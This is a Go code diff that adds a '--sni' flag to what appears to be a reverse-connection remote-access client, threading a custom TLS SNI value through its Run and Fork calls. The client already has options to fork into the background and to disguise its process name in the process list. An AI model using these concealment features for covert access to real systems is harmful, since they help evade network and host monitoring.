@@ -37,6 +37,7 @@ var (
 	fingerprint string
 	proxy       string
 	ignoreInput string
+	customSNI   string
 )
 
 func printHelp() {
@@ -46,12 +47,14 @@ func printHelp() {
 	fmt.Println("\t\t--fingerprint\tServer public key SHA256 hex fingerprint for auth")
 	fmt.Println("\t\t--proxy\tLocation of HTTP connect proxy to use")
 	fmt.Println("\t\t--process_name\tProcess name shown in tasklist/process list")
+	fmt.Println("\t\t--sni\tWhen using TLS set the clients requested SNI to this value")
+
 }
 
 func main() {
 
 	if len(os.Args) == 0 || ignoreInput == "true" {
-		Run(destination, fingerprint, proxy)
+		Run(destination, fingerprint, proxy, customSNI)
 		return
 	}
 
@@ -84,6 +87,11 @@ func main() {
 		fingerprint = userSpecifiedFingerprint
 	}
 
+	userSpecifiedSNI, err := line.GetArgString("sni")
+	if err == nil {
+		customSNI = userSpecifiedSNI
+	}
+
 	processArgv, _ := line.GetArgsString("process_name")
 
 	if !(line.IsSet("d") || line.IsSet("destination")) && len(destination) == 0 && len(line.Arguments) < 1 {
@@ -107,20 +115,20 @@ func main() {
 	}
 
 	if fg || child {
-		Run(destination, fingerprint, proxy)
+		Run(destination, fingerprint, proxy, customSNI)
 		return
 	}
 
 	if strings.HasPrefix(destination, "stdio://") {
 		// We cant fork off of an inetd style connection or stdin/out will be closed
 		log.SetOutput(io.Discard)
-		Run(destination, fingerprint, proxy)
+		Run(destination, fingerprint, proxy, customSNI)
 		return
 	}
 
-	err = Fork(destination, fingerprint, proxy, processArgv...)
+	err = Fork(destination, fingerprint, proxy, customSNI, processArgv...)
 	if err != nil {
-		Run(destination, fingerprint, proxy)
+		Run(destination, fingerprint, proxy, customSNI)
 	}
 
 }
